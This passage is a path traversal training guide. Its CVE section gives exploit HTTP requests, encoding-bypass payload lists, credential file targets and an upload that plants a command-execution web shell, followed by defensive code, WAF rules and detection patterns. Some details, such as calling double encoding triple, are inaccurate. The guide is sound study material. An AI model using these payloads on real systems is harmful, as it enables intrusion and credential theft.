When URL rewrite rules are enabled, Tomcat incorrectly normalizes the rewritten URL **before** decoding it. This allows attackers to embed traversal sequences in encoded form that survive normalization and execute after decoding.

**Technical Details:**

**Vulnerable Processing Order:**
```
1. Original Request: /app/..%2Fconf/secrets.xml
2. Rewrite Rule Applied: → /internal/..%2Fconf/secrets.xml
3. Path Normalization: /internal/..%2Fconf/secrets.xml (no change, encoded)
4. URL Decoding: /internal/../conf/secrets.xml
5. Final Path: /conf/secrets.xml ✅ Access granted!
```

**Correct Processing Order:**
```
1. Original Request: /app/..%2Fconf/secrets.xml
2. URL Decoding: /app/../conf/secrets.xml
3. Path Normalization: /conf/secrets.xml
4. Rewrite Rule Check: Does /conf/secrets.xml match rewrite rule?
5. Authorization: Is /conf/secrets.xml authorized?
```

**Exploit Example:**
```http
GET /app/..%2F..%2Fconf/tomcat-users.xml HTTP/1.1
Host: vulnerable-tomcat.example.com

Response:
<?xml version="1.0" encoding="UTF-8"?>
<tomcat-users xmlns="http://tomcat.apache.org/xml">
  <user username="admin" password="s3cr3t" roles="manager-gui,admin-gui"/>
</tomcat-users>
```

**Configuration Triggering Vulnerability:**
```xml
<!-- web.xml -->
<filter>
    <filter-name>UrlRewriteFilter</filter-name>
    <filter-class>org.tuckey.web.filters.urlrewrite.UrlRewriteFilter</filter-class>
</filter>

<filter-mapping>
    <filter-name>UrlRewriteFilter</filter-name>
    <url-pattern>/*</url-pattern>
</filter-mapping>
```

**Impact:**
- Access to Tomcat configuration files
- Read `tomcat-users.xml` for credentials
- Access application source code
- Read database connection strings
- Bypass authentication mechanisms

**Remediation:**
- Update Apache Tomcat to patched version
- Review and restrict URL rewrite rules
- Implement strict path validation after rewrite
- Use canonical path resolution before authorization

**Reference:** [Indusface Apache Tomcat CVE-2025-55752](https://www.indusface.com/blog/cve-2025-55752-apache-tomcat-vulnerability/)

---

### CVE-2024-13059: AnythingLLM Path Traversal (Disclosed Feb 2025)

**Severity:** High (CVSS: 8.4)
**Affected:** AnythingLLM < 1.3.1
**Impact:** Arbitrary file write → Remote Code Execution

**Vulnerability:**
Improper handling of non-ASCII filenames in the multer library leads to path traversal during file uploads. Authenticated users (manager or admin roles) can write files to arbitrary server locations, achieving remote code execution.

**Technical Details:**

**Vulnerable Code Pattern:**
```javascript
// Simplified vulnerable code
const multer = require('multer');

const storage = multer.diskStorage({
    destination: './uploads/',
    filename: function (req, file, cb) {
        // Vulnerable: filename not sanitized
        const userFilename = file.originalname;
        cb(null, userFilename);
    }
});

const upload = multer({ storage: storage });

app.post('/upload', requiresAuth, upload.single('file'), (req, res) => {
    res.json({ success: true, path: req.file.path });
});
```

**Exploit:**
```http
POST /api/workspace/upload HTTP/1.1
Host: anythingllm.example.com
Authorization: Bearer MANAGER_TOKEN
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="file"; filename="../../server.js"
Content-Type: application/javascript

const express = require('express');
const { exec } = require('child_process');

// Backdoor route
app.get('/backdoor', (req, res) => {
    exec(req.query.cmd, (error, stdout) => {
        res.send(stdout);
    });
});

------WebKitFormBoundary--

Response:
{
  "success": true,
  "path": "./uploads/../../server.js"
}
```

**Attack Chain:**
```
1. Authenticate as manager/admin
   ↓
2. Upload file with traversal in filename: "../../malicious.js"
   ↓
3. File written outside upload directory
   ↓
4. Overwrite critical application files or inject backdoor
   ↓
5. Remote code execution achieved
   ↓
6. Full server compromise
```

**Non-ASCII Exploitation:**
```
Filename: ../../日本語/backdoor.js
Encoding issues cause improper path validation
Result: File written outside intended directory
```

**Impact:**
- Remote Code Execution (RCE)
- Overwrite application source code
- Inject persistent backdoors
- Access database and credentials
- Lateral movement in network

**Remediation:**
- Update AnythingLLM to version 1.3.1+
- Sanitize uploaded filenames:
```javascript
const path = require('path');
const crypto = require('crypto');

filename: function (req, file, cb) {
    // Generate safe random filename
    const ext = path.extname(file.originalname);
    const safeName = crypto.randomBytes(16).toString('hex') + ext;
    cb(null, safeName);
}
```
- Validate file extensions
- Store uploads outside webroot
- Use UUIDs for filenames instead of user input

**Reference:** [OffSec CVE-2024-13059 Analysis](https://www.offsec.com/blog/cve-2024-13059/)

---

### CVE-2024-38816 & CVE-2024-38819: Spring Framework (2024)

**Severity:** High (CVSS: 7.5)
**Affected:** Spring Framework WebMvc.fn and WebFlux.fn
**Impact:** Path traversal in static resource serving

**Vulnerability:**
Applications serving static resources through Spring's functional web frameworks are vulnerable to path traversal. Attackers can craft malicious HTTP requests to access any file on the file system accessible to the Spring application process.

**Affected Configurations:**

**Vulnerable Code (WebMvc.fn):**
```java
@Configuration
public class WebConfig {
    @Bean
    public RouterFunction<ServerResponse> staticResourceRouter() {
        return RouterFunctions.route()
            .resources("/static/**", new ClassPathResource("static/"))
            .build();
    }
}
```

**Vulnerable Code (WebFlux.fn):**
```java
@Configuration
public class WebFluxConfig {
    @Bean
    public RouterFunction<ServerResponse> resourceRouter() {
        return RouterFunctions.resources("/files/**",
            new FileSystemResource("/var/www/files/"));
    }
}
```

**Exploit Examples:**

**CVE-2024-38816 Exploit:**
```http
GET /static/..%2F..%2F..%2Fetc/passwd HTTP/1.1
Host: vulnerable-spring-app.com

Response:
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
```

**CVE-2024-38819 Exploit (Advanced):**
```http
GET /files/..;/..;/..;/etc/passwd HTTP/1.1
Host: vulnerable-spring-app.com

Response:
root:x:0:0:root:/root:/bin/bash
...
```

**Encoding Variations:**
```
/static/../../../etc/passwd
/static/..%2F..%2F..%2Fetc/passwd
/static/..%252F..%252F..%252Fetc/passwd
/static/..;/..;/..;/etc/passwd
/files/....//....//....//etc/passwd
```

**Impact:**
- Read application source code
- Access `application.properties` with database credentials
- Read Spring Boot configuration
- Extract JWT signing keys
- Access cloud metadata endpoints
- Read user-uploaded files

**Attack Targets:**
```
/etc/passwd
/etc/shadow
/proc/self/environ
./src/main/resources/application.properties
./src/main/resources/application.yml
./target/classes/application.properties
~/.aws/credentials
~/.ssh/id_rsa
```

**Remediation:**
- Update Spring Framework to patched versions:
  - Spring Framework 6.1.x → 6.1.13+
  - Spring Framework 6.0.x → 6.0.24+
  - Spring Framework 5.3.x → 5.3.39+
- Replace functional resource handlers with traditional `@Controller` approach:

```java
@Controller
public class ResourceController {

    @Value("${resource.base.path}")
    private String basePath;

    @GetMapping("/files/{filename}")
    public ResponseEntity<Resource> serveFile(@PathVariable String filename) {
        // Validate filename
        if (filename.contains("..") || filename.contains("/")
            || filename.contains("\\")) {
            throw new IllegalArgumentException("Invalid filename");
        }

        Path filePath = Paths.get(basePath, filename);
        Path normalizedPath = filePath.normalize();

        // Verify path is within base directory
        if (!normalizedPath.startsWith(Paths.get(basePath).normalize())) {
            throw new SecurityException("Access denied");
        }

        Resource resource = new FileSystemResource(normalizedPath);
        return ResponseEntity.ok()
            .body(resource);
    }
}
```

**References:**
- [Spring CVE-2024-38816](https://spring.io/security/cve-2024-38816/)
- [Spring CVE-2024-38819](https://spring.io/security/cve-2024-38819/)

---

### Additional Notable Path Traversal CVEs

#### CVE-2023-32315: Openfire Admin Console

**Exploit:**
```http
GET /setup/setup-s/%u002e%u002e/%u002e%u002e/log.jsp?log=info&mode=asc&lines=All HTTP/1.1
Host: openfire-server.com
```

Unicode-encoded traversal bypasses path validation, accessing restricted JSP files.

---

#### CVE-2021-45967: Pascom Cloud Phone System

**Exploit:**
```http
GET /services/pluginscript/..;/..;/getFavicon?host=file:///etc/passwd HTTP/1.1
Host: pascom.example.com
```

Nginx/Tomcat path parsing inconsistency: Nginx treats `..;/` as directory, Tomcat processes as traversal.

---

#### CVE-2020-23575: Kyocera Printer

**Exploit:**
```http
GET /wlmeng/../../../etc/passwd%00index.htm HTTP/1.1
Host: 192.168.1.100
```

Null byte injection bypasses extension validation in embedded web server.

---

#### CVE-2019-9726: Homematic CCU3

**Exploit:**
```http
GET /.%00./.%00./etc/passwd HTTP/1.1
Host: homematic.local
```

Repeated null byte obfuscation bypasses basic path filters.

---

#### CVE-2018-1271: Spring MVC (Historical)

**Exploit:**
```http
GET /static/%255c%255c..%255c/..%255c/windows/win.ini HTTP/1.1
Host: spring-app.com
```

Triple URL encoding bypasses Spring's path normalization on Windows systems.

---

## Industry Standards

### OWASP Resources

#### OWASP Top 10 2021

**A01:2021 - Broken Access Control**

Path traversal falls under broken access control, the #1 web application security risk. Key points:
- 3.81% of applications tested had broken access control vulnerabilities
- 318,000+ occurrences in the dataset
- 34 CWEs mapped to this category
- Moved up from 5th position in OWASP Top 10 2017

**Risk Factors:**
- Prevalence: Common
- Detectability: Average
- Technical Impact: High
- Business Impact: Severe

**Related CWEs:**
- **CWE-22:** Improper Limitation of a Pathname to a Restricted Directory ('Path Traversal')
- **CWE-23:** Relative Path Traversal
- **CWE-36:** Absolute Path Traversal
- **CWE-73:** External Control of File Name or Path
- **CWE-434:** Unrestricted Upload of File with Dangerous Type
- **CWE-552:** Files or Directories Accessible to External Parties

#### OWASP ASVS (Application Security Verification Standard)

**V12.3: File Execution Requirements**

**V12.3.1:** Verify that user-submitted filenames use metadata or indirect references to prevent path traversal attacks (Level 1)

**V12.3.2:** Verify that user-submitted filename metadata is validated or ignored to prevent disclosure, creation, or modification of local files (Level 1)

**V12.3.5:** Verify that untrusted file data is not used directly with system API or libraries without sufficient validation (Level 2)

**V12.3.6:** Verify that the application does not include and execute functionality from untrusted sources, such as unverified content distribution networks or JavaScript libraries (Level 2)

#### OWASP Testing Guide (WSTG)

**WSTG-ATHZ-01: Testing Directory Traversal/File Include**

**Test Objectives:**
- Identify injection points that pertain to path traversal
- Assess bypassing techniques and identify the extent of path traversal

**Testing Methods:**

1. **Black-Box Testing:**
```
Input Vectors:
- ../
- ..\
- ..%2f
- %2e%2e%2f
- ....//
- ..%00/
```

2. **Gray-Box Testing:**
- Review source code for file operation functions
- Identify user input flowing to filesystem APIs
- Check for validation and sanitization

3. **Automated Tools:**
- Burp Suite Scanner
- OWASP ZAP
- Nikto
- dotdotpwn

#### OWASP Cheat Sheets

**Input Validation Cheat Sheet:**

**Path Traversal Prevention:**
```java
// Recommended approach
String filename = request.getParameter("file");

// Whitelist validation
if (!ALLOWED_FILES.contains(filename)) {
    throw new SecurityException("File not allowed");
}

// Or use indirect reference
String fileId = request.getParameter("id");
String filename = FILE_MAP.get(fileId);

// Canonicalize and verify path
File file = new File(BASE_DIR, filename);
String canonicalPath = file.getCanonicalPath();

if (!canonicalPath.startsWith(BASE_DIR)) {
    throw new SecurityException("Path traversal detected");
}
```

**File Upload Cheat Sheet:**
- Never trust user-supplied filenames
- Use generated filenames (UUIDs)
- Store files outside web root
- Validate file types by content, not extension
- Implement virus scanning

---

### MITRE Standards

#### CWE-22: Path Traversal

**Description:** The product uses external input to construct a pathname that should be within a restricted directory, but does not properly neutralize special elements within the pathname that can cause it to resolve to a location outside of the intended directory.

**Common Consequences:**

| Scope | Impact | Likelihood |
|-------|--------|------------|
| Confidentiality | Read Files or Directories | High |
| Integrity | Modify Files or Directories | Medium |
| Availability | Execute Unauthorized Code | Medium |

**Modes of Introduction:**
- Architecture and Design
- Implementation
- Operation

**Applicable Platforms:**
- Languages: Any (universal vulnerability)
- Operating Systems: Unix, Windows, macOS
- Architectures: Web applications, desktop applications, mobile apps

#### CWE-23: Relative Path Traversal

**Example:**
```
../../etc/passwd
..\..\..\windows\win.ini
```

#### CWE-36: Absolute Path Traversal

**Example:**
```
/etc/passwd
C:\windows\win.ini
```

#### CWE-73: External Control of File Name or Path

**Broader Category:** Encompasses both path traversal and other file manipulation attacks.

#### CAPEC-126: Path Traversal

**Attack Pattern Enumeration and Classification**

**Execution Flow:**

1. **Explore:** Identify file operation input vectors
   ```
   Test: ../../../etc/passwd
   Observe: Error messages, behavior changes
   ```

2. **Experiment:** Try encoding variations
   ```
   ../../../etc/passwd
   ..%2f..%2f..%2fetc/passwd
   ..%252f..%252f..%252fetc/passwd
   ```

3. **Exploit:** Achieve unauthorized file access
   ```
   Read sensitive files
   Modify configuration
   Execute code (if write access)
   ```

**Attack Prerequisites:**
- Application accepts user input for file operations
- Insufficient input validation
- Inadequate access controls

**Resources Required:**
- Web browser or HTTP client
- Knowledge of target file system structure
- Burp Suite or similar tool (optional)

**Attack Motivation:**
- Data theft
- System reconnaissance
- Privilege escalation preparation
- Compliance violation proof

---

### NIST Guidelines

#### NIST SP 800-53 Rev. 5

**SI-10: Information Input Validation**

Control: The information system checks the validity of input.

**Implementation Guidance:**
- Validate all input from untrusted sources
- Use whitelist validation where possible
- Canonicalize paths before validation
- Implement defense in depth

**SI-10(3): Predictable Behavior**
Verify that the system behaves in a predictable manner when invalid inputs are received.

**SI-10(5): Restrict Inputs to Trusted Sources**
Restrict the use of information inputs to trusted sources and approved formats.

#### NIST SP 800-53 Rev. 5 - AC-3: Access Enforcement

Enforce approved authorizations for logical access to information and system resources.

**Path Traversal Context:**
- Verify user authorization before file access
- Implement principle of least privilege
- Log all file access attempts
- Monitor for anomalous access patterns

#### NIST Cybersecurity Framework

**PR.DS-5:** Protections against data leaks are implemented

**DE.CM-1:** The network is monitored to detect potential cybersecurity events

---

### PCI DSS Requirements

#### Requirement 6.5.8: Improper Access Control

**Path Traversal Prevention:**

Applications must prevent path traversal attacks through:
- Input validation
- Output encoding
- Principle of least privilege
- Secure coding standards

**Implementation:**
```
✓ Validate all file path inputs
✓ Use whitelist of allowed files
✓ Implement proper access controls
✓ Log file access attempts
✓ Regular security testing
✓ Code review for file operations
✓ Penetration testing
```

**Testing Procedures:**
- Review custom code for path traversal vulnerabilities
- Use static analysis tools
- Perform dynamic testing with path traversal payloads
- Verify access controls function correctly

---

### ISO/IEC 27001

**A.14.2.1: Secure Development Policy**

Organizations must establish secure development policies that address:
- Input validation requirements
- File access controls
- Security testing procedures

**Path Traversal Controls:**
- Mandatory code review for file operations
- Security testing including path traversal
- Developer training on secure coding
- Vulnerability management processes

---

### SANS Top 25 Most Dangerous Software Weaknesses

**CWE-22: Path Traversal**

Ranked in Top 25 (position varies by year)

**2025 CWE Top 25:**
Path traversal consistently appears due to:
- High prevalence in web applications
- Severe impact potential
- Relative ease of exploitation
- Frequent discovery in security assessments

---

## Prevention Best Practices

### Defense in Depth Strategy

Implement multiple layers of protection:

#### Layer 1: Avoid Dynamic File Paths

**Best Practice:** Never accept user input for file paths

```java
// ❌ Vulnerable
String filename = request.getParameter("file");
return readFile(filename);

// ✅ Secure - Use indirect reference
String fileId = request.getParameter("id");
Map<String, String> fileMap = Map.of(
    "1", "document1.pdf",
    "2", "document2.pdf"
);
String filename = fileMap.get(fileId);
if (filename == null) {
    throw new IllegalArgumentException("Invalid file ID");
}
return readFile(BASE_DIR + filename);
```

#### Layer 2: Whitelist Validation

**Best Practice:** Only allow known-good values

```python
# ✅ Secure whitelist approach
ALLOWED_FILES = {
    'profile.jpg',
    'logo.png',
    'document.pdf'
}

def get_file(filename):
    if filename not in ALLOWED_FILES:
        raise ValueError("File not allowed")

    return read_file(os.path.join(BASE_DIR, filename))
```

#### Layer 3: Path Canonicalization

**Best Practice:** Resolve and verify the actual file path

```java
import java.io.File;
import java.io.IOException;

public class SecureFileAccess {
    private static final String BASE_DIR = "/var/www/files/";

    public byte[] getFile(String filename) throws IOException {
        // Build full path
        File file = new File(BASE_DIR, filename);

        // Canonicalize to resolve . and ..
        String canonicalPath = file.getCanonicalPath();
        String canonicalBase = new File(BASE_DIR).getCanonicalPath();

        // Verify path is within base directory
        if (!canonicalPath.startsWith(canonicalBase)) {
            throw new SecurityException("Path traversal attempt detected");
        }

        return Files.readAllBytes(file.toPath());
    }
}
```

```python
import os

def secure_file_access(filename):
    BASE_DIR = '/var/www/files/'

    # Build and normalize path
    file_path = os.path.join(BASE_DIR, filename)
    real_path = os.path.realpath(file_path)
    real_base = os.path.realpath(BASE_DIR)

    # Verify path is within base directory
    if not real_path.startswith(real_base):
        raise ValueError("Path traversal detected")

    with open(real_path, 'rb') as f:
        return f.read()
```

```javascript
// Node.js
const path = require('path');
const fs = require('fs');

function secureFileAccess(filename) {
    const baseDir = '/var/www/files/';

    // Build and normalize path
    const filePath = path.join(baseDir, filename);
    const realPath = fs.realpathSync(filePath);
    const realBase = fs.realpathSync(baseDir);

    // Verify path is within base directory
    if (!realPath.startsWith(realBase)) {
        throw new Error('Path traversal detected');
    }

    return fs.readFileSync(realPath);
}
```

#### Layer 4: Input Sanitization

**Best Practice:** Remove dangerous characters and patterns

```python
import re
import os

def sanitize_filename(filename):
    # Remove null bytes
    filename = filename.replace('\x00', '')

    # Remove path separators
    filename = filename.replace('/', '')
    filename = filename.replace('\\', '')

    # Remove parent directory references
    filename = filename.replace('..', '')

    # Remove leading dots (hidden files)
    filename = filename.lstrip('.')

    # Allow only alphanumeric, dash, underscore, dot
    filename = re.sub(r'[^a-zA-Z0-9._-]', '', filename)

    # Limit length
    filename = filename[:255]

    if not filename:
        raise ValueError("Invalid filename")

    return filename
```

#### Layer 5: File System Permissions

**Best Practice:** Run application with minimal privileges

```bash
# Create dedicated user for application
sudo useradd -r -s /bin/false webapp

# Set restrictive permissions on file directory
sudo chown webapp:webapp /var/www/files/
sudo chmod 750 /var/www/files/

# Application files read-only
sudo chmod 640 /var/www/files/*

# Run application as non-privileged user
sudo -u webapp /opt/app/start.sh
```

#### Layer 6: Chroot Jail / Containerization

**Best Practice:** Isolate application file system access

```bash
# Chroot jail approach
sudo chroot /var/www/jail /opt/app/start.sh

# Docker container approach
FROM node:18-alpine
RUN addgroup -g 1001 -S app && adduser -u 1001 -S app -G app
USER app
WORKDIR /app
COPY --chown=app:app . .
CMD ["node", "server.js"]
```

---

### Framework-Specific Protections

#### Express.js (Node.js)

```javascript
const express = require('express');
const path = require('path');
const fs = require('fs').promises;

const app = express();

// Secure file serving
app.get('/files/:filename', async (req, res) => {
    const filename = req.params.filename;

    // Whitelist validation
    const allowedFiles = ['doc1.pdf', 'doc2.pdf', 'image1.png'];
    if (!allowedFiles.includes(filename)) {
        return res.status(403).send('Access denied');
    }

    // Use express.static for static files (secure by default)
    // express.static automatically prevents traversal
});

// Use express.static middleware (secure)
app.use('/static', express.static('public', {
    dotfiles: 'deny',  // Prevent access to hidden files
    index: false,      // Disable directory listing
    redirect: false
}));
```

#### Spring Boot (Java)

```java
@RestController
public class FileController {

    @Value("${file.base.directory}")
    private String baseDirectory;

    @GetMapping("/files/{fileId}")
    public ResponseEntity<Resource> getFile(@PathVariable String fileId) {
        // Use indirect reference (ID → filename mapping)
        String filename = fileService.getFilenameById(fileId);

        if (filename == null) {
            return ResponseEntity.notFound().build();
        }

        try {
            Path filePath = Paths.get(baseDirectory, filename);
            Path normalizedPath = filePath.normalize();

            // Verify path is within base directory
            if (!normalizedPath.startsWith(Paths.get(baseDirectory).normalize())) {
                return ResponseEntity.status(HttpStatus.FORBIDDEN).build();
            }

            Resource resource = new UrlResource(normalizedPath.toUri());

            if (!resource.exists()) {
                return ResponseEntity.notFound().build();
            }

            return ResponseEntity.ok()
                .contentType(MediaType.APPLICATION_OCTET_STREAM)
                .body(resource);

        } catch (MalformedURLException e) {
            return ResponseEntity.badRequest().build();
        }
    }
}
```

#### Django (Python)

```python
from django.http import FileResponse, HttpResponseForbidden
from django.conf import settings
import os

def serve_file(request, file_id):
    # Use indirect reference
    file_mapping = {
        '1': 'document1.pdf',
        '2': 'document2.pdf',
    }

    filename = file_mapping.get(file_id)
    if not filename:
        return HttpResponseForbidden('Invalid file')

    # Build and validate path
    base_dir = settings.MEDIA_ROOT
    file_path = os.path.join(base_dir, filename)
    real_path = os.path.realpath(file_path)
    real_base = os.path.realpath(base_dir)

    if not real_path.startswith(real_base):
        return HttpResponseForbidden('Access denied')

    if not os.path.exists(real_path):
        return HttpResponseNotFound('File not found')

    return FileResponse(open(real_path, 'rb'))
```

#### PHP

```php
<?php
function serveFile($fileId) {
    // Use indirect reference
    $fileMapping = [
        '1' => 'document1.pdf',
        '2' => 'document2.pdf',
    ];

    if (!isset($fileMapping[$fileId])) {
        http_response_code(403);
        die('Invalid file');
    }

    $filename = $fileMapping[$fileId];
    $baseDir = '/var/www/files/';
    $filePath = $baseDir . $filename;

    // Canonicalize and verify
    $realPath = realpath($filePath);
    $realBase = realpath($baseDir);

    if ($realPath === false || !str_starts_with($realPath, $realBase)) {
        http_response_code(403);
        die('Access denied');
    }

    if (!file_exists($realPath)) {
        http_response_code(404);
        die('File not found');
    }

    // Serve file
    header('Content-Type: application/octet-stream');
    header('Content-Disposition: attachment; filename="' . basename($realPath) . '"');
    readfile($realPath);
}
?>
```

---

### Security Testing Integration

#### Static Application Security Testing (SAST)

**Tools:**
- SonarQube
- Checkmarx
- Veracode
- Fortify

**Configuration Example (SonarQube):**
```xml
<!-- sonar-project.properties -->
sonar.issue.enforce.multicriteria=e1

sonar.issue.enforce.multicriteria.e1.ruleKey=squid:S2083
sonar.issue.enforce.multicriteria.e1.message=Path traversal vulnerabilities
```

#### Dynamic Application Security Testing (DAST)

**Tools:**
- Burp Suite Professional
- OWASP ZAP
- Acunetix
- Netsparker

**Automated Scan Configuration (ZAP):**
```yaml
# zap-scan.yaml
env:
  contexts:
    - name: "Application"
      urls:
        - "https://target.example.com"
      includePaths:
        - "https://target.example.com/.*"
      authentication:
        method: "form"
        parameters:
          loginUrl: "https://target.example.com/login"
          loginRequestData: "username=test&password=test"

jobs:
  - type: "activeScan"
    parameters:
      scanPolicyName: "API-Minimal"
      maxRuleDurationInMins: 5

alerts:
  - riskcode: "3"  # High
    name: "Path Traversal"
    action: "fail"
```

#### Interactive Application Security Testing (IAST)

**Tools:**
- Contrast Security
- Seeker (by Synopsys)

**Advantages:**
- Runtime analysis during testing
- Accurate vulnerability detection
- Low false positive rate

#### Software Composition Analysis (SCA)

**Tools:**
- Snyk
- WhiteSource
- Black Duck

**Purpose:**
- Identify vulnerable dependencies
- Track CVEs in third-party libraries
- Monitor for path traversal vulnerabilities in frameworks

---

### Secure Development Lifecycle

#### Design Phase

**Security Requirements:**
- [ ] Define file access controls
- [ ] Specify allowed file types and locations
- [ ] Design indirect reference system
- [ ] Plan audit logging for file access

**Threat Modeling:**
```
Threat: Path Traversal Attack
Attack Vector: User-controlled filename parameter
Asset: Sensitive system files, source code
Risk: High (High impact, Medium likelihood)
Mitigation: Indirect reference + whitelist + path validation
```

#### Implementation Phase

**Secure Coding Standards:**
- Never use user input directly in file paths
- Always validate and sanitize inputs
- Use framework-provided secure file handling
- Implement defense in depth

**Code Review Checklist:**
- [ ] File operations use indirect references
- [ ] Path validation implemented correctly
- [ ] Whitelist restricts allowed files
- [ ] Canonicalization performed before checks
- [ ] Error messages don't reveal path information
- [ ] Logging captures file access attempts

#### Testing Phase

**Security Test Cases:**
```
TC-001: Basic Path Traversal
Input: ../../../etc/passwd
Expected: Access denied

TC-002: Encoded Path Traversal
Input: ..%2f..%2f..%2fetc/passwd
Expected: Access denied

TC-003: Double Encoded
Input: ..%252f..%252f..%252fetc/passwd
Expected: Access denied

TC-004: Absolute Path
Input: /etc/passwd
Expected: Access denied

TC-005: Null Byte Injection
Input: ../../../../etc/passwd%00.png
Expected: Access denied

TC-006: Whitelist Bypass Attempt
Input: allowed.pdf/../../../etc/passwd
Expected: Access denied

TC-007: Valid File Access
Input: document1.pdf
Expected: File served successfully
```

#### Deployment Phase

**Security Hardening:**
```bash
# Set restrictive file permissions
chmod 750 /var/www/files/
chmod 640 /var/www/files/*

# Run application as non-root
sudo -u webapp /opt/app/start.sh

# Enable SELinux/AppArmor
sudo setenforce 1

# Configure WAF rules
# ModSecurity rule for path traversal
SecRule ARGS "@contains ../" \
    "id:1234,phase:2,deny,status:403,msg:'Path Traversal Attack'"
```

**Monitoring & Logging:**
```python
import logging

def secure_file_access(filename):
    logger = logging.getLogger('security')

    try:
        # Validate filename
        if '..' in filename or '/' in filename:
            logger.warning(f"Path traversal attempt: {filename}",
                         extra={'ip': request.remote_addr})
            raise SecurityException("Invalid filename")

        # Access file
        logger.info(f"File accessed: {filename}",
                   extra={'user': request.user.id})
        return read_file(filename)

    except SecurityException:
        logger.error(f"Security violation: {filename}",
                    extra={'ip': request.remote_addr})
        raise
```

---

### Web Application Firewall (WAF) Rules

#### ModSecurity Rules

```apache
# Path traversal detection
SecRule REQUEST_URI|ARGS|REQUEST_BODY "@rx (?:\\.\\./|\\.\\.\\\\|%2e%2e%2f|%2e%2e%5c)" \
    "id:950001,\
    phase:2,\
    deny,\
    status:403,\
    msg:'Path Traversal Attack',\
    severity:'CRITICAL',\
    tag:'OWASP_CRS/WEB_ATTACK/PATH_TRAVERSAL',\
    logdata:'Matched Data: %{MATCHED_VAR} found within %{MATCHED_VAR_NAME}'"

# Encoded path traversal
SecRule REQUEST_URI|ARGS "@rx %(?:2e|25(?:2e|5c)|c0%ae|c1%9c)" \
    "id:950002,\
    phase:2,\
    deny,\
    status:403,\
    msg:'Encoded Path Traversal Attack',\
    severity:'CRITICAL'"

# Absolute path access
SecRule ARGS "@rx ^(?:/etc/|/proc/|/sys/|C:\\\\)" \
    "id:950003,\
    phase:2,\
    deny,\
    status:403,\
    msg:'Absolute Path Access Attempt',\
    severity:'CRITICAL'"
```

#### AWS WAF Rules

```json
{
  "Name": "PathTraversalProtection",
  "Priority": 10,
  "Statement": {
    "OrStatement": {
      "Statements": [
        {
          "ByteMatchStatement": {
            "SearchString": "../",
            "FieldToMatch": {
              "AllQueryArguments": {}
            },
            "TextTransformations": [
              {
                "Priority": 0,
                "Type": "URL_DECODE"
              }
            ],
            "PositionalConstraint": "CONTAINS"
          }
        },
        {
          "ByteMatchStatement": {
            "SearchString": "..\\",
            "FieldToMatch": {
              "AllQueryArguments": {}
            },
            "TextTransformations": [
              {
                "Priority": 0,
                "Type": "URL_DECODE"
              }
            ],
            "PositionalConstraint": "CONTAINS"
          }
        }
      ]
    }
  },
  "Action": {
    "Block": {}
  },
  "VisibilityConfig": {
    "SampledRequestsEnabled": true,
    "CloudWatchMetricsEnabled": true,
    "MetricName": "PathTraversalRule"
  }
}
```

---

### Incident Response

#### Detection Indicators

**Log Patterns to Monitor:**
```
# Web server access logs
GET /image?filename=../../../etc/passwd HTTP/1.1 403
GET /files?path=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd HTTP/1.1 403

# Application logs
[SECURITY] Path traversal attempt detected: ../../../etc/passwd from IP 192.168.1.100
[ERROR] File access denied: /etc/passwd outside base directory

# IDS/IPS alerts
Alert: Path Traversal Attack Detected
Source: 192.168.1.100:54321
Destination: 10.0.1.50:443
Payload: filename=../../../../etc/passwd
```

**SIEM Correlation Rules:**
```sql
-- Splunk query
index=web_logs
(uri="*../*" OR uri="*..\\*" OR uri="*%2e%2e%2f*")
| stats count by src_ip, uri
| where count > 5

-- ELK query
GET /logs/_search
{
  "query": {
    "bool": {
      "should": [
        {"wildcard": {"request.uri": "*../*"}},
        {"wildcard": {"request.uri": "*%2e%2e%2f*"}}
      ],
      "minimum_should_match": 1
    }
  },
  "aggs": {
    "by_ip": {
      "terms": {"field": "client.ip"}
    }
  }
}
```

#### Response Procedures

**Immediate Actions:**
1. Block attacker IP address at firewall/WAF
2. Review access logs for successful exploits
3. Verify integrity of sensitive files
4. Enable additional logging and monitoring

**Investigation:**
1. Identify all affected systems
2. Review authentication logs
3. Check for lateral movement
4. Analyze file access patterns
5. Preserve evidence for forensics

**Remediation:**
1. Patch vulnerable application
2. Implement additional security controls
3. Rotate compromised credentials
4. Restore files from backup if modified

**Post-Incident:**
1. Update security policies
2. Enhance monitoring rules
3. Conduct lessons learned review
4. Provide security awareness training

---

## Conclusion

Path traversal vulnerabilities remain a significant threat to web applications despite being well-understood. The PortSwigger Web Security Academy labs provide excellent hands-on practice for understanding:

- Basic path traversal exploitation
- Bypass techniques for common defenses
- Encoding methods to evade filters
- Real-world attack scenarios

**Key Takeaways:**

1. **Never trust user input** for file operations
2. **Use indirect references** instead of direct file paths
3. **Implement multiple layers** of defense (whitelist + canonicalization + permissions)
4. **Test thoroughly** with various encoding and bypass techniques
5. **Monitor and log** all file access attempts
6. **Stay updated** on new CVEs and attack techniques

**Next Steps:**

- Complete all 6 PortSwigger path traversal labs
- Practice exploitation in legal environments (CTFs, bug bounties)
- Implement secure file handling in your applications
- Conduct code reviews for path traversal vulnerabilities
- Set up monitoring and alerting for path traversal attacks

**Additional Resources:**

- PortSwigger Web Security Academy: https://portswigger.net/web-security/file-path-traversal
- OWASP Path Traversal: https://owasp.org/www-community/attacks/Path_Traversal
- PayloadsAllTheThings: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Directory%20Traversal
- HackerOne Reports: Search for "path traversal" in disclosed reports

---

**Document Version:** 1.0
**Last Updated:** January 2026
**Maintained By:** Pentest Skill Development Team
